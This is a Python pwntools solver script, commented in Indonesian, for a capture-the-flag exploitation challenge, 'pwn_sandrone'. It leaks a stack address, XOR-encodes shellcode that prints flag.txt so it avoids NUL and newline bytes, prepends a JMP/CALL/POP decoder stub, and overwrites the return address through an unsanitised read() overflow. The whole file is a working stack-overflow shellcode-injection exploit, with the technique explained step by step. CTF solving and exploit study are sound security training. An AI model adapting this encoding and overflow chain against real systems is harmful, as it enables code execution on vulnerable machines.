#!/usr/bin/env python3
"""
Solver -- pwn_sandrone (Binary Exploitation C).

Teknik: shellcode injection (NX off) + badchar-free XOR payload encoding,
mengikuti metode kombinatorial di makalah "Badchar-Free XOR Payload Encoding
in Binary Exploitation" (Justin Sepvian, ITB) -- lihat WRITEUP.md bagian 5
untuk rujukan lengkap dan penjelasan teori (set theory + GF(2^8) + PIE).

Dua channel di binary (lihat bin/sandrone.c):
  1. "payload diagnostik" -- fgets() + strcpy() -> badchar NATURAL:
     0x00 (strcpy berhenti di NUL) dan 0x0a (fgets berhenti di newline).
     Shellcode yang disimpan lewat channel ini WAJIB di-encode (XOR) dulu.
  2. "kontrol overflow"   -- raw read(), TIDAK disanitasi -- dipakai buat
     overflow return address asli (return address nyaris pasti mengandung
     byte NUL di 2 byte teratas alamat stack, jadi tidak boleh lewat channel
     yang disanitasi).
"""
from pwn import *

context.binary = exe = ELF("./bin/sandrone", checksec=False)
context.arch = "amd64"

if args.REMOTE:
    io = remote(args.HOST or "127.0.0.1", int(args.PORT or 40301))
else:
    io = process(["./bin/sandrone"])

# --- 1. Leak alamat buf, turunkan alamat payload ---------------------------
io.recvuntil(b"debug: buf @ ")
buf_addr = int(io.recvline().strip(), 16)
log.info(f"leaked buf address: {hex(buf_addr)}")

# frame[0..127] = payload (alamat RENDAH), frame[128..191] = buf (alamat
# TINGGI) -- lihat komentar di bin/sandrone.c. Offset ini properti statis
# layout stack frame, dicek lewat objdump (bukan ditebak):
#   lea -0xd0(%rbp),%rax ; mov %rax,-0x8(%rbp)   -> payload = frame
#   lea -0xd0(%rbp),%rax ; sub $-0x80,%rax       -> buf     = frame + 0x80
PAYLOAD_DELTA = 0x80
payload_addr = buf_addr - PAYLOAD_DELTA
log.info(f"derived payload address: {hex(payload_addr)}")

# --- 2. Shellcode target + badchar-free XOR key search (Algorithm 1) -------
raw_shellcode = asm(shellcraft.amd64.linux.cat("flag.txt") + shellcraft.amd64.linux.exit(0))
BADCHARS = {0x00, 0x0a}  # NUL (strcpy) + newline (fgets)

S = set(raw_shellcode)  # byte unik di payload (set theory, bagian III-C paper)
invalid_keys = set()
for b in BADCHARS:
    for s in S:
        invalid_keys.add(s ^ b)  # Ab = {p (xor) b | p in S}, lihat paper bagian III-D
valid_keys = sorted((set(range(256)) - invalid_keys) - BADCHARS)
assert valid_keys, "tidak ada key XOR valid -- shellcode/badchar set perlu diganti"
KEY = valid_keys[0]  # Algorithm 1 baris 14: return min(ValidKeys)
LEN = len(raw_shellcode)
log.info(f"K_valid = {len(valid_keys)} kandidat, dipakai K = {hex(KEY)}, LEN = {LEN}")

encoded = bytes(b ^ KEY for b in raw_shellcode)
assert not any(b in BADCHARS for b in encoded)

# --- 3. Decoder stub -- teknik JMP/CALL/POP (Erickson, "Hacking: The Art of
#     Exploitation") supaya posisi-independen TANPA immediate/alamat mentah
#     (lea rip-relative untuk offset kecil akan selalu mengandung byte NUL
#     dari zero-padding disp32 -- call mundur ke label dekat menghasilkan
#     rel32 negatif, byte tinggi FF bukan 00, jadi aman) ---------------------
# pop rsi  -> rsi = alamat byte tepat setelah instruksi `call decoder` di bawah
# mov rdi,rsi -> simpan titik mulai buat jump balik setelah decode selesai
stub_src = f"""
.intel_syntax noprefix
start:
    jmp short call_shellcode
decoder:
    pop rsi
    mov rdi, rsi
    mov cl, {LEN}
    mov dl, {KEY}
decode_loop:
    xor byte ptr [rsi], dl
    inc rsi
    dec cl
    jnz decode_loop
    jmp rdi
call_shellcode:
    call decoder
"""
stub = asm(stub_src)
assert not any(b in BADCHARS for b in stub), "decoder stub mengandung badchar -- cek LEN/KEY"
log.info(f"decoder stub: {len(stub)} byte, bersih dari badchar")

channel1 = stub + encoded
assert len(channel1) <= 128, "channel1 kepanjangan buat buffer payload[128]"
assert not any(b in BADCHARS for b in channel1)

# --- 4. Channel 1: kirim decoder stub + shellcode terenkode lewat jalur yang
#     disanitasi (strcpy) -- aman karena sudah badchar-free -----------------
io.recvuntil(b"payload diagnostik: ")
io.sendline(channel1)

# --- 5. Channel 2: overflow mentah (raw read, tidak disanitasi) -- overwrite
#     return address balik ke payload_addr (alamat desoder stub) -----------
# Offset ke saved RBP dicek lewat objdump: buf = rbp-0x50 -> jarak ke rbp+0
# = 0x50 (80 byte) + 8 byte saved RBP = 88 byte sebelum return address.
OFFSET_TO_RETADDR = 88
io.recvuntil(b"kontrol overflow: ")
payload2 = b"A" * OFFSET_TO_RETADDR + p64(payload_addr)
io.send(payload2)

flag = io.recvall(timeout=3)
print(flag.decode(errors="replace"))
io.close()
